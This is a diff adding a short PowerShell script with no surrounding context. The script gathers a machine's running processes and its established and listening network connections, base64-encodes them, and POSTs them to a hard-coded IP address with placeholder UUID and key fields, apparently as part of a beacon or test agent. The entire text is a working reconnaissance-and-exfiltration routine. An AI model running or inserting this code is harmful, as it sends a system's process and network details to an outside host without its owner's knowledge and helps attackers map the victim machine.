@@ -1,0 +1,7 @@
+$message=(get-process | select-object id, name, path) | Out-String
+$message+= (netstat -ano | findstr EST) | Out-String
+$message+= (netstat -ano | findstr LIST) | Out-String
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+(Invoke-WebRequest -UseBasicParsing http://192.168.142.37:80 -ContentType "application/json" -Method POST -Body "{ 'UUID':'TEST_UUID', 'key':'12345' , 'event' : 'send' , 'data' : '$EncodedText' , 'file' : 'processlist_netstat' }")
+
